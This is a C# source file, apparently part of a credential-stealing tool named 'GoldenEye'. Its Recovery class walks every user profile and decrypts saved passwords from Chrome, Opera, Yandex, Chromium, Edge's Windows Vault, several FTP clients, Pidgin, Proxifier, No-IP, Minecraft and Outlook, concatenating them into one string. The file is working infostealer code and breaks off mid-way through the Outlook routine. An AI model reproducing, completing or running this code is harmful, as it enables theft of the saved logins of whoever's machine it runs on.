using GoldenEye.Functions;
using Microsoft.VisualBasic;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Xml;

namespace GoldenEye
{
    internal class Recovery
    {
        public string allPws = string.Empty;

        public void recoverAll()
        {
            // Browsers
            RecoverOpera();
            recoverChrome();
            recoverEdge();
            recoverYandex();           
            // FTP Clients
            RecoverFileZilla();
            recoverCoreFTP();
            recoverSmartFTP();
            recoverFlashFXP();
            // E-Mail Clients
            recoverOutlook();
            // Other Software
            RecoverPidgin();
            RecoverProxifier();
            recoverNOIP();
            recoverMinecraft();

        }

        #region "Other Shit"

        #region "MAIN"

        public Recovery(DriveInfo Drive)
        {
            this.Drive = Drive;
        }

        public Recovery()
        {
            foreach (DriveInfo Drive in DriveInfo.GetDrives())
            {
                if (Drive.RootDirectory.FullName == Path.GetPathRoot(Environment.SystemDirectory))
                {
                    this.Drive = Drive; break;
                }
            }
        }

        private DriveInfo _drive;

        public DriveInfo Drive
        {
            get
            {
                return _drive;
            }
            set
            {
                _drive = value;
            }
        }

        private List<Account> _accounts = new List<Account>();

        public List<Account> Accounts
        {
            get
            {
                return _accounts;
            }
            set
            {
                _accounts = value;
            }
        }

        #endregion "MAIN"

        #region "HELPERS"

        private string ExtractValue(XmlNode Node, string Key, bool DecodeBase64 = false)
        {
            XmlNode exNode = Node.SelectSingleNode(Key);
            if (DecodeBase64)
                return new UTF8Encoding().GetString(Convert.FromBase64String(exNode.InnerText));
            else
                return exNode.InnerText;
        }

        private bool isWindowsXP()
        {
            return (System.Environment.OSVersion.Version.Major == 5);
        }

        private string[] GetAppDataFolders()
        {
            List<string> iList = new List<string>();
            if (isWindowsXP())
            {
                foreach (string Dir in Directory.GetDirectories(Drive.RootDirectory.FullName + @"Documents and Settings\", "*", SearchOption.TopDirectoryOnly))
                    iList.Add(Dir + "Application Data");
            }
            else
                foreach (string Dir in Directory.GetDirectories(Drive.RootDirectory.FullName + @"Users\", "*", SearchOption.TopDirectoryOnly))
                {
                    System.IO.DirectoryInfo dirInfo = new System.IO.DirectoryInfo(Dir);
                    iList.Add(Drive.RootDirectory.FullName + @"Users\" + dirInfo.Name + @"\AppData");
                }
            return iList.ToArray();
        }

        private string[] GetInstalledAppsDirs()
        {
            string Apps = string.Empty;
            List<string> iList = new List<string>();
            foreach (string Dir in Directory.GetDirectories(Drive.RootDirectory.FullName, "Program Files*", SearchOption.TopDirectoryOnly))
                iList.Add(Dir);
            return iList.ToArray();
        }

        #endregion "HELPERS"

        #region "Crypt32.dll"

        [DllImport("Crypt32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptProtectData(
    ref DATA_BLOB pDataIn,
    String szDataDescr,
    ref DATA_BLOB pOptionalEntropy,
    IntPtr pvReserved,
    ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct,
    CryptProtectFlags dwFlags,
    ref DATA_BLOB pDataOut
);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DATA_BLOB
        {
            public int cbData;
            public IntPtr pbData;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct CRYPTPROTECT_PROMPTSTRUCT
        {
            public int cbSize;
            public CryptProtectPromptFlags dwPromptFlags;
            public IntPtr hwndApp;
            public String szPrompt;
        }

        [Flags]
        private enum CryptProtectPromptFlags
        {
            // prompt on unprotect
            CRYPTPROTECT_PROMPT_ON_UNPROTECT = 0x1,

            // prompt on protect
            CRYPTPROTECT_PROMPT_ON_PROTECT = 0x2
        }

        [Flags]
        private enum CryptProtectFlags
        {
            // for remote-access situations where ui is not an option
            // if UI was specified on protect or unprotect operation, the call
            // will fail and GetLastError() will indicate ERROR_PASSWORD_RESTRICTION
            CRYPTPROTECT_UI_FORBIDDEN = 0x1,

            // per machine protected data -- any user on machine where CryptProtectData
            // took place may CryptUnprotectData
            CRYPTPROTECT_LOCAL_MACHINE = 0x4,

            // force credential synchronize during CryptProtectData()
            // Synchronize is only operation that occurs during this operation
            CRYPTPROTECT_CRED_SYNC = 0x8,

            // Generate an Audit on protect and unprotect operations
            CRYPTPROTECT_AUDIT = 0x10,

            // Protect data with a non-recoverable key
            CRYPTPROTECT_NO_RECOVERY = 0x20,

            // Verify the protection of a protected blob
            CRYPTPROTECT_VERIFY_PROTECTION = 0x40
        }

        [
DllImport("Crypt32.dll",
SetLastError = true,
CharSet = System.Runtime.InteropServices.CharSet.Auto)
]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptUnprotectData(
    ref DATA_BLOB pDataIn,
    StringBuilder szDataDescr,
    ref DATA_BLOB pOptionalEntropy,
    IntPtr pvReserved,
    ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct,
    CryptProtectFlags dwFlags,
    ref DATA_BLOB pDataOut
);

        #endregion "Crypt32.dll"

        #region "Decrypt"

        private string Decrypt(byte[] Datas)
        {
            try
            {
                DATA_BLOB inj, Ors = new DATA_BLOB();
                DATA_BLOB asd = new DATA_BLOB();
                GCHandle Ghandle = GCHandle.Alloc(Datas, GCHandleType.Pinned);
                inj.pbData = Ghandle.AddrOfPinnedObject();
                inj.cbData = Datas.Length;
                Ghandle.Free();
                CRYPTPROTECT_PROMPTSTRUCT asdf = new CRYPTPROTECT_PROMPTSTRUCT();
                string aha = string.Empty;
                CryptUnprotectData(ref inj, null, ref asd, default(IntPtr), ref asdf, 0, ref Ors);

                //            ref DATA_BLOB pDataIn,
                //StringBuilder szDataDescr,
                //    ref DATA_BLOB pOptionalEntropy,
                //    IntPtr pvReserved,
                //    ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct,
                //    CryptProtectFlags dwFlags,
                //    ref DATA_BLOB pDataOut

                byte[] Returned = new byte[Ors.cbData + 1];
                Marshal.Copy(Ors.pbData, Returned, 0, Ors.cbData);
                string TheString = Encoding.UTF8.GetString(Returned);
                return TheString.Substring(0, TheString.Length - 1);
            }
            catch
            {
                return "";
            }
        }

        #endregion "Decrypt"

        #endregion "Other Shit"

        #region "OPERA"

        public void RecoverOpera()
        {
            foreach (string AppData in GetAppDataFolders())
            {
                if (!File.Exists(AppData + @"\Roaming\Opera Software\Opera Stable\Login Data"))
                    continue;
                SQLiteHandler sql = new SQLiteHandler(AppData + @"\Roaming\Opera Software\Opera Stable\Login Data");
                sql.ReadTable("logins");
                for (int i = 0; i <= sql.GetRowCount() - 1; i++)
                {
                    string url = sql.GetValue(i, "origin_url");
                    string username = sql.GetValue(i, "username_value");
                    string password_crypted = sql.GetValue(i, "password_value");
                    string password = string.Empty;
                    if (!string.IsNullOrEmpty(password_crypted))
                    {
                        password = Decrypt(Encoding.Default.GetBytes(password_crypted));
                    }
                    else
                    {
                        password = "";
                    }
                    // Format like this:
                    // Type ² URL ² User ² Pass ³
                    allPws += "Opera²" + url + "²" + username + "²" + password + "³";
                }
            }
        }

        #endregion "OPERA"

        #region "CHROME"

        public void recoverChrome()
        {
            foreach (string AppData in GetAppDataFolders())
            {
                try
                {
                    if (!File.Exists(AppData + @"\Local\Google\Chrome\User Data\Default\Login Data"))
                        continue;
                    SQLiteHandler sql = new SQLiteHandler(AppData + @"\Local\Google\Chrome\User Data\Default\Login Data");

                    try
                    {
                        sql.ReadTable("logins");
                    }
                    catch { }

                    for (int i = 0; i <= sql.GetRowCount() - 1; i++)
                    {
                        string url = sql.GetValue(i, "origin_url");
                        string username = sql.GetValue(i, "username_value");
                        string password_crypted = sql.GetValue(i, "password_value");
                        string password = string.Empty;
                        if (!string.IsNullOrEmpty(password_crypted))
                        {
                            password = Decrypt(Encoding.Default.GetBytes(password_crypted));
                        }
                        else
                        {
                            password = "";
                        }

                        // Format like this:
                        // Type ² URL ² User ² Pass ³
                        allPws += "Chrome²" + url + "²" + username + "²" + password + "³";
                    }
                }
                catch (Exception eax)
                {
                    Console.WriteLine(eax.ToString());
                }
            }
        }

        #endregion "CHROME"

        #region "YANDEX"
        public void recoverYandex()
        {
            foreach (string AppData in GetAppDataFolders())
            {
                try
                {
                    if (!File.Exists(AppData + @"\Local\Yandex\YandexBrowser\User Data\Default\Login Data"))
                        continue;
                    SQLiteHandler sql = new SQLiteHandler(AppData + @"\Local\Yandex\YandexBrowser\User Data\Default\Login Data");

                    try
                    {
                        sql.ReadTable("logins");
                    }
                    catch { }

                    for (int i = 0; i <= sql.GetRowCount() - 1; i++)
                    {
                        string url = sql.GetValue(i, "origin_url");
                        string username = sql.GetValue(i, "username_value");
                        string password_crypted = sql.GetValue(i, "password_value");
                        string password = string.Empty;
                        if (!string.IsNullOrEmpty(password_crypted))
                        {
                            password = Decrypt(Encoding.Default.GetBytes(password_crypted));
                        }
                        else
                        {
                            password = "";
                        }

                        // Format like this:
                        // Type ² URL ² User ² Pass ³
                        allPws += "Yandex²" + url + "²" + username + "²" + password + "³";
                    }
                }
                catch (Exception eax)
                {
                    Console.WriteLine(eax.ToString());
                }
            }
        }
        #endregion

        #region "Chromium"
        public void recoverChromium()
        {
            foreach (string AppData in GetAppDataFolders())
            {
                try
                {
                    if (!File.Exists(AppData + @"\Local\Chromium\User Data\Default\Login Data"))
                        continue;
                    SQLiteHandler sql = new SQLiteHandler(AppData + @"\Local\Chromium\User Data\Default\Login Data");

                    try
                    {
                        sql.ReadTable("logins");
                    }
                    catch { }

                    for (int i = 0; i <= sql.GetRowCount() - 1; i++)
                    {
                        string url = sql.GetValue(i, "origin_url");
                        string username = sql.GetValue(i, "username_value");
                        string password_crypted = sql.GetValue(i, "password_value");
                        string password = string.Empty;
                        if (!string.IsNullOrEmpty(password_crypted))
                        {
                            password = Decrypt(Encoding.Default.GetBytes(password_crypted));
                        }
                        else
                        {
                            password = "";
                        }

                        // Format like this:
                        // Type ² URL ² User ² Pass ³
                        allPws += "Chromium²" + url + "²" + username + "²" + password + "³";
                    }
                }
                catch (Exception eax)
                {
                    Console.WriteLine(eax.ToString());
                }
            }
        }

        #endregion

        #region "FileZilla"

        public void RecoverFileZilla()
        {
            try
            {
                foreach (string AppData in GetAppDataFolders())
                {
                    if (System.IO.File.Exists(AppData + @"\Roaming\FileZilla\recentservers.xml"))
                    {
                        XmlDocument x = new XmlDocument();
                        x.Load(AppData + @"\Roaming\FileZilla\recentservers.xml");
                        foreach (XmlNode Node in x.ChildNodes[1].SelectNodes("RecentServers/Server"))
                        {
                            string host = string.Format("{0}:{1}", ExtractValue(Node, "Host"), ExtractValue(Node, "Port"));
                            string user = ExtractValue(Node, "User");
                            string pass = ExtractValue(Node, "Pass", (Node.SelectSingleNode("Pass[@encoding='base64']") != null));

                            // Format like this:
                            // Type ² URL ² User ² Pass ³
                            allPws += "FileZilla²" + host + "²" + user + "²" + pass + "³";
                        }
                        x = null;
                    }
                    else
                        continue;
                }
            }
            catch (Exception e)
            {
            }
        }

        #endregion "FileZilla"

        #region "PIDGIN"

        public void RecoverPidgin()
        {
            try
            {
                foreach (string AppData in GetAppDataFolders())
                {
                    if (!System.IO.File.Exists(AppData + @"\Roaming\.purple\accounts.xml"))
                        continue;
                    XmlDocument Doc = new XmlDocument();
                    Doc.Load(AppData + @"\Roaming\.purple\accounts.xml");
                    foreach (XmlNode Node in Doc.ChildNodes[1].SelectNodes("account"))
                    {
                        string Domain = ExtractValue(Node, "protocol");
                        string Username = ExtractValue(Node, "name");
                        string Password = ExtractValue(Node, "password");

                        // Format like this:
                        // Type ² URL ² User ² Pass ³
                        allPws += "Pidgin²" + Domain + "²" + Username + "²" + Password + "³";
                    }
                    Doc = null;
                }
            }
            catch (Exception e)
            {
            }
        }

        #endregion "PIDGIN"

        #region "Proxifier"

        public void RecoverProxifier()
        {
            try
            {
                foreach (string AppData in GetAppDataFolders())
                {
                    if (!System.IO.File.Exists(AppData + @"\Roaming\Proxifier\Profiles\Default.ppx"))
                        continue;
                    XmlDocument Doc = new XmlDocument();
                    Doc.Load(AppData + @"\Roaming\Proxifier\Profiles\Default.ppx");
                    foreach (XmlNode Node in Doc.ChildNodes[1].SelectSingleNode("ProxyList").SelectNodes("Proxy"))
                    {
                        string IPAddress = "[" + Node.Attributes["type"].Value + "]" + ExtractValue(Node, "Address") + ":" + ExtractValue(Node, "Port");
                        string Username = "";
                        string Password = "";
                        foreach (XmlNode n in Node.ChildNodes)
                        {
                            if (n.Name == "Authentication")
                            {
                                if (n.Attributes["enabled"].Value == "true")
                                {
                                    Username = ExtractValue(n, "Username");
                                    Password = ExtractValue(n, "Password");
                                }
                            }
                        }
                        // Format like this:
                        // Type ² URL ² User ² Pass ³
                        allPws += "Proxifier²" + IPAddress + "²" + Username + "²" + Password + "³";
                    }
                    Doc = null;
                }
            }
            catch (Exception e)
            {
            }
        }

        #endregion "Proxifier"

        #region "Internet Explorer / Edge"
        public void recoverEdge()
        {
            var OSVersion = Environment.OSVersion.Version;
            var OSMajor = OSVersion.Major;
            var OSMinor = OSVersion.Minor;

            Type VAULT_ITEM;

            if (OSMajor >= 6 && OSMinor >= 2)
            {
                VAULT_ITEM = typeof(VaultCli.VAULT_ITEM_WIN8);
            }
            else
            {
                VAULT_ITEM = typeof(VaultCli.VAULT_ITEM_WIN7);
            }

            /* Helper function to extract the ItemValue field from a VAULT_ITEM_ELEMENT struct */
            object GetVaultElementValue(IntPtr vaultElementPtr)
            {
                object results;
                object partialElement = System.Runtime.InteropServices.Marshal.PtrToStructure(vaultElementPtr, typeof(VaultCli.VAULT_ITEM_ELEMENT));
                FieldInfo partialElementInfo = partialElement.GetType().GetField("Type");
                var partialElementType = partialElementInfo.GetValue(partialElement);

                IntPtr elementPtr = (IntPtr)(vaultElementPtr.ToInt64() + 16);
                switch ((int)partialElementType)
                {
                    case 7: // VAULT_ELEMENT_TYPE == String; These are the plaintext passwords!
                        IntPtr StringPtr = System.Runtime.InteropServices.Marshal.ReadIntPtr(elementPtr);
                        results = System.Runtime.InteropServices.Marshal.PtrToStringUni(StringPtr);
                        break;
                    case 0: // VAULT_ELEMENT_TYPE == bool
                        results = System.Runtime.InteropServices.Marshal.ReadByte(elementPtr);
                        results = (bool)results;
                        break;
                    case 1: // VAULT_ELEMENT_TYPE == Short
                        results = System.Runtime.InteropServices.Marshal.ReadInt16(elementPtr);
                        break;
                    case 2: // VAULT_ELEMENT_TYPE == Unsigned Short
                        results = System.Runtime.InteropServices.Marshal.ReadInt16(elementPtr);
                        break;
                    case 3: // VAULT_ELEMENT_TYPE == Int
                        results = System.Runtime.InteropServices.Marshal.ReadInt32(elementPtr);
                        break;
                    case 4: // VAULT_ELEMENT_TYPE == Unsigned Int
                        results = System.Runtime.InteropServices.Marshal.ReadInt32(elementPtr);
                        break;
                    case 5: // VAULT_ELEMENT_TYPE == Double
                        results = System.Runtime.InteropServices.Marshal.PtrToStructure(elementPtr, typeof(Double));
                        break;
                    case 6: // VAULT_ELEMENT_TYPE == GUID
                        results = System.Runtime.InteropServices.Marshal.PtrToStructure(elementPtr, typeof(Guid));
                        break;
                    case 12: // VAULT_ELEMENT_TYPE == Sid
                        IntPtr sidPtr = System.Runtime.InteropServices.Marshal.ReadIntPtr(elementPtr);
                        var sidObject = new System.Security.Principal.SecurityIdentifier(sidPtr);
                        results = sidObject.Value;
                        break;
                    default:
                        /* Several VAULT_ELEMENT_TYPES are currently unimplemented according to
                         * Lord Graeber. Thus we do not implement them. */
                        results = null;
                        break;
                }
                return results;
            }
            /* End helper function */

            Int32 vaultCount = 0;
            IntPtr vaultGuidPtr = IntPtr.Zero;
            var result = VaultCli.VaultEnumerateVaults(0, ref vaultCount, ref vaultGuidPtr);

            //var result = CallVaultEnumerateVaults(VaultEnum, 0, ref vaultCount, ref vaultGuidPtr);

            if ((int)result != 0)
            {
                throw new Exception("[ERROR] Unable to enumerate vaults. Error (0x" + result.ToString() + ")");
            }

            // Create dictionary to translate Guids to human readable elements
            IntPtr guidAddress = vaultGuidPtr;
            Dictionary<Guid, string> vaultSchema = new Dictionary<Guid, string>();
            vaultSchema.Add(new Guid("2F1A6504-0641-44CF-8BB5-3612D865F2E5"), "Windows Secure Note");
            vaultSchema.Add(new Guid("3CCD5499-87A8-4B10-A215-608888DD3B55"), "Windows Web Password Credential");
            vaultSchema.Add(new Guid("154E23D0-C644-4E6F-8CE6-5069272F999F"), "Windows Credential Picker Protector");
            vaultSchema.Add(new Guid("4BF4C442-9B8A-41A0-B380-DD4A704DDB28"), "Web Credentials");
            vaultSchema.Add(new Guid("77BC582B-F0A6-4E15-4E80-61736B6F3B29"), "Windows Credentials");
            vaultSchema.Add(new Guid("E69D7838-91B5-4FC9-89D5-230D4D4CC2BC"), "Windows Domain Certificate Credential");
            vaultSchema.Add(new Guid("3E0E35BE-1B77-43E7-B873-AED901B6275B"), "Windows Domain Password Credential");
            vaultSchema.Add(new Guid("3C886FF3-2669-4AA2-A8FB-3F6759A77548"), "Windows Extended Credential");
            vaultSchema.Add(new Guid("00000000-0000-0000-0000-000000000000"), null);

            for (int i = 0; i < vaultCount; i++)
            {
                // Open vault block
                object vaultGuidString = System.Runtime.InteropServices.Marshal.PtrToStructure(guidAddress, typeof(Guid));
                Guid vaultGuid = new Guid(vaultGuidString.ToString());
                guidAddress = (IntPtr)(guidAddress.ToInt64() + System.Runtime.InteropServices.Marshal.SizeOf(typeof(Guid)));
                IntPtr vaultHandle = IntPtr.Zero;
                string vaultType;
                if (vaultSchema.ContainsKey(vaultGuid))
                {
                    vaultType = vaultSchema[vaultGuid];
                }
                else
                {
                    vaultType = vaultGuid.ToString();
                }
                result = VaultCli.VaultOpenVault(ref vaultGuid, (UInt32)0, ref vaultHandle);
                if (result != 0)
                {
                    throw new Exception("Unable to open the following vault: " + vaultType + ". Error: 0x" + result.ToString());
                }
                // Vault opened successfully! Continue.

                // Fetch all items within Vault
                int vaultItemCount = 0;
                IntPtr vaultItemPtr = IntPtr.Zero;
                result = VaultCli.VaultEnumerateItems(vaultHandle, 512, ref vaultItemCount, ref vaultItemPtr);
                if (result != 0)
                {
                    throw new Exception("[ERROR] Unable to enumerate vault items from the following vault: " + vaultType + ". Error 0x" + result.ToString());
                }
                var structAddress = vaultItemPtr;
                if (vaultItemCount > 0)
                {
                    // For each vault item...
                    for (int j = 1; j <= vaultItemCount; j++)
                    {
                        // Begin fetching vault item...
                        var currentItem = System.Runtime.InteropServices.Marshal.PtrToStructure(structAddress, VAULT_ITEM);
                        structAddress = (IntPtr)(structAddress.ToInt64() + System.Runtime.InteropServices.Marshal.SizeOf(VAULT_ITEM));

                        IntPtr passwordVaultItem = IntPtr.Zero;
                        // Field Info retrieval
                        FieldInfo schemaIdInfo = currentItem.GetType().GetField("SchemaId");
                        Guid schemaId = new Guid(schemaIdInfo.GetValue(currentItem).ToString());
                        FieldInfo pResourceElementInfo = currentItem.GetType().GetField("pResourceElement");
                        IntPtr pResourceElement = (IntPtr)pResourceElementInfo.GetValue(currentItem);
                        FieldInfo pIdentityElementInfo = currentItem.GetType().GetField("pIdentityElement");
                        IntPtr pIdentityElement = (IntPtr)pIdentityElementInfo.GetValue(currentItem);
                        FieldInfo dateTimeInfo = currentItem.GetType().GetField("LastModified");
                        UInt64 lastModified = (UInt64)dateTimeInfo.GetValue(currentItem);

                        object[] vaultGetItemArgs;
                        IntPtr pPackageSid = IntPtr.Zero;
                        if (OSMajor >= 6 && OSMinor >= 2)
                        {
                            // Newer versions have package sid
                            FieldInfo pPackageSidInfo = currentItem.GetType().GetField("pPackageSid");
                            pPackageSid = (IntPtr)pPackageSidInfo.GetValue(currentItem);
                            result = VaultCli.VaultGetItem_WIN8(vaultHandle, ref schemaId, pResourceElement, pIdentityElement, pPackageSid, IntPtr.Zero, 0, ref passwordVaultItem);
                        }
                        else
                        {
                            result = VaultCli.VaultGetItem_WIN7(vaultHandle, ref schemaId, pResourceElement, pIdentityElement, IntPtr.Zero, 0, ref passwordVaultItem);
                        }

                        if (result != 0)
                        {
                            throw new Exception("Error occured while retrieving vault item. Error: 0x" + result.ToString());
                        }
                        object passwordItem = System.Runtime.InteropServices.Marshal.PtrToStructure(passwordVaultItem, VAULT_ITEM);
                        FieldInfo pAuthenticatorElementInfo = passwordItem.GetType().GetField("pAuthenticatorElement");
                        IntPtr pAuthenticatorElement = (IntPtr)pAuthenticatorElementInfo.GetValue(passwordItem);
                        // Fetch the credential from the authenticator element
                        object cred = GetVaultElementValue(pAuthenticatorElement);
                        object packageSid = null;
                        if (pPackageSid != IntPtr.Zero && pPackageSid != null)
                        {
                            packageSid = GetVaultElementValue(pPackageSid);
                        }
                        if (cred != null) // Indicates successful fetch
                        {
                            object resource = GetVaultElementValue(pResourceElement);
                            object identity = GetVaultElementValue(pIdentityElement);
                            // Format like this:
                            // Type ² URL ² User ² Pass ³
                            allPws += "IE/Edge²" + resource.ToString() + "²" + identity.ToString() + "²" + cred.ToString() + "³";
                        }
                    }
                }
            }
        }
        #endregion

        #region "CoreFTP"

        public void recoverCoreFTP()
        {
            try
            {
                string sPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\CoreFTP\\sites.idx";

                StringBuilder RegBuilder = new StringBuilder();
                using (StreamReader Reader = new StreamReader(sPath))
                {
                    string line = "";
                    while ((line = Reader.ReadLine()) != null)
                    {
                        try
                        {
                            RegBuilder.Append(line.Split(new string[] { "  " }, StringSplitOptions.None)[0].ToString() + " ");
                        }
                        catch
                        {
                            continue;
                        }
                    }

                }

                string[] RegistryPaths = RegBuilder.ToString().Substring(0, RegBuilder.ToString().Length - 2).Split(' ');
                string structure = string.Empty;
                string sHost = "";
                string sPort = "";
                string sUser = "";
                string sPassword = "";
                string registryPath = @"HKEY_CURRENT_USER\Software\FTPWare\COREFTP\Sites\";
                foreach (string path in RegistryPaths)
                {

                    sHost = Registry.GetValue(string.Format(registryPath + "{0}", path), "Host", " ").ToString();
                    sUser = Registry.GetValue(string.Format(registryPath + "{0}", path), "User", " ").ToString();
                    sPort = Registry.GetValue(string.Format(registryPath + "{0}", path), "Port", " ").ToString();
                    sPassword = DecryptCoreFTPPassword(Registry.GetValue(string.Format(registryPath + "{0}", path), "PW", " ").ToString());
                    if (!string.IsNullOrEmpty(sUser) && !string.IsNullOrEmpty(sPort) && !string.IsNullOrEmpty(sHost))
                    {
                        // Format like this:
                        // Type ² URL ² User ² Pass ³
                        allPws += "CoreFTP²" + sHost + ":" + sPort + "²" + sUser + "²" + sPassword + "³";
                    }
                    else { continue; }
                }

            }
            catch { }
        }
        private string DecryptCoreFTPPassword(string HexString)
        {
            StringBuilder buffer = new StringBuilder(HexString.Length * 3 / 2);
            for (int i = 0; i < HexString.Length; i++)
            {
                if ((i > 0) & (i % 2 == 0))
                    buffer.Append("-");
                buffer.Append(HexString[i]);
            }

            string Reversed = buffer.ToString();

            int length = (Reversed.Length + 1) / 3;
            byte[] arr = new byte[length];
            for (int i = 0; i < length; i++)
            {
                arr[i] = Convert.ToByte(Reversed.Substring(3 * i, 2), 16);
            }

            RijndaelManaged AES = new RijndaelManaged()
            {
                Mode = CipherMode.ECB,
                Key = Encoding.ASCII.GetBytes("hdfzpysvpzimorhk"),
                Padding = PaddingMode.Zeros,
            };
            ICryptoTransform Transform = AES.CreateDecryptor(AES.Key, AES.IV);
            return Encoding.UTF8.GetString(Transform.TransformFinalBlock(arr, 0, arr.Length));
        }
        #endregion

        #region "SmartFTP"

        public void recoverSmartFTP()
        {
            try
            {
                string sPath = Interaction.Environ("APPDATA") + @"\SmartFTP\Client 2.0\Favorites\Quick Connect\" + FileSystem.Dir(Interaction.Environ("APPDATA") + @"\SmartFTP\Client 2.0\Favorites\Quick Connect\*.xml");
                string sFile = ReadFile(sPath);
                string sHost = Cut(sFile, "<Host>", "</Host>");
                string sPort = Cut(sFile, "<Port>", "</Port>");
                string sUser = Cut(sFile, "<User>", "</User>");
                string sPwd = Cut(sFile, "<Password>", "</Password>");
                string sEntry = Cut(sFile, "<Name>", "</Name>");

                if (sUser.Equals(""))
                { }
                else
                {
                    // Format like this:
                    // Type ² URL ² User ² Pass ³
                    allPws += "SmartFTP²" + sHost + ":" + sPort + "²" + sUser + "²" + sPwd + "³";
                }
            }
            catch { }
        }

        public string ReadFile(string sFile)
        {
            System.IO.StreamReader OpenFile = new System.IO.StreamReader(sFile);
            return OpenFile.ReadToEnd().ToString();
        }
        public string Cut(string sInhalt, string sText, string stext2)
        {
            string[] c;
            string[] c2;
            c = Strings.Split(sInhalt, sText);
            c2 = Strings.Split(c[1], stext2);
            return c2[0];
        }

        public string ReadLine(string filename, int line)
        {
            try
            {
                string[] lines = File.ReadAllText(filename, System.Text.Encoding.Default).Split(Convert.ToChar(Constants.vbCrLf));
                if (line > 0)
                    return lines[line - 1];
                else if (line < 0)
                    return lines[lines.Length + line - 1];
                else
                    return "";
            }
            catch (Exception ex)
            {
                return "";
            }
        }

        #endregion

        #region "FlashFXP"
        public void recoverFlashFXP()
        {
            try
            {
                string sPath = Strings.Replace(Interaction.Environ("APPDATA"), Interaction.Environ("Username"), "All Users") + @"\FlashFXP\" + "3" + @"\quick.dat";
                string sFile = ReadFile(sPath);
                string sHost = Cut(sFile, "IP=", Constants.vbNewLine);
                string sPort = Cut(sFile, "port=", Constants.vbNewLine);
                string sUser = Cut(sFile, "user=", Constants.vbNewLine);
                string sPwd = Cut(sFile, "pass=", Constants.vbNewLine);
                string sEntry = Cut(sFile, "created=", Constants.vbNewLine);

                if (sUser == "")
                { }
                else
                {
                    // Format like this:
                    // Type ² URL ² User ² Pass ³
                    allPws += "FlashFXP²" + sHost + ":" + sPort + "²" + sUser + "²" + sPwd + "³";
                }
            }
            catch { }
        }
        #endregion

        #region "NO-IP"
        public void recoverNOIP()
        {
            try
            {
                string Username;
                Username = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Vitalwerks\DUC", "Username", null).ToString();

                string Password;
                Password = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Vitalwerks\DUC", "Password", null).ToString();

                // Format like this:
                // Type ² URL ² User ² Pass ³
                allPws += "DUC(NOIP)²" + "https://www.noip.com/" + "²" + Username + "²" + base64Decode(Password) + "³";
            }
            catch { }
        }

        public string base64Decode(string data)
        {
            try
            {
                System.Text.UTF8Encoding encoder = new System.Text.UTF8Encoding();
                System.Text.Decoder utf8Decode = encoder.GetDecoder();
                byte[] todecode_byte = Convert.FromBase64String(data);
                int charCount = utf8Decode.GetCharCount(todecode_byte, 0, todecode_byte.Length);
                char[] decoded_char = new char[charCount - 1 + 1];
                utf8Decode.GetChars(todecode_byte, 0, todecode_byte.Length, decoded_char, 0);
                string result = new String(decoded_char);
                return result;
            }
            catch (Exception e)
            {
                return "ERROR";
            }
        }
        #endregion

        #region "Minecraft"
        private readonly byte[] LastLoginSalt = new byte[] { 0x0c, 0x9d, 0x4a, 0xe4, 0x1e, 0x83, 0x15, 0xfc };
        private const string LastLoginPassword = "passwordfile";
        private string GetMinecraftPath()
        {

            return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".minecraft");
        }
        private string LastLoginFile
        {

            get
            {
                return Path.Combine(GetMinecraftPath(), "lastlogin");
            }
        }

        public void recoverMinecraft()
        {
            try
            {
                string loginData = string.Empty;
                string username = string.Empty;
                string password = string.Empty;
                LastLogin lastlogin = LastLogin.GetLastLogin(LastLoginFile);
                if (lastlogin != null)
                {
                    username = lastlogin.Username;
                    password = lastlogin.Password;
                }
                if (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
                {
                    // Format like this:
                    // Type ² URL ² User ² Pass ³
                    allPws += "Minecraft²" + "https://minecraft.net" + "²" + username + "²" + password + "³";
                }
            }
            catch { }

        }
        #endregion

        #region "Outlook"
        void recoverOutlook()
        {
            string[] passValues = new[] { "IMAP Password", "POP3 Password", "HTTP Password", "SMTP Password" }; // Outlook storage password value name depend your client type. It using 4 different name
            byte[] EncPass;
            string decPass = null;
            byte[] byteMail;
            byte[] byteSmtp;
            // Outlook change sub key folder name and path in every version. I added 2007, 2010, 2013 and 2016 paths. If you know different version, you can add this array.
            RegistryKey[] pRegKey = new[] {
                Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676"),
                Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676"),
                Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows Messaging Subsystem\Profiles\9375CFF0413111d3B88A00104B2A6676"),
                Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676") };

            try
            {

                foreach(RegistryKey RegKey in pRegKey)
                {
                    if(!RegKey.Equals(""))
                    {
                        foreach (string KeyName in RegKey.GetSubKeyNames())
                        {
                            RegistryKey key = RegKey.OpenSubKey(KeyName);

                            UTF8Encoding enc = new UTF8Encoding();

                            if(!key.GetValue("Email").Equals("") && key.GetValue("IMAP Password").Equals("") || key.GetValue("POP3 Password").Equals("") || key.GetValue("HTTP Password").Equals("") || key.GetValue("SMTP Password").Equals(""))
                            {
                                foreach(string str in passValues)
                                {
                                    if(!key.GetValue(str).Equals(""))
                                    {
                                        EncPass = (byte[])key.GetValue(str);
                                        decPass = decryptOutlookPassword(EncPass); // Decrypt password.
                                    }
                                }

                           
                                object mailObj = key.GetValue("Email");
                                try // I use a "Try" for get email value. 
                                {
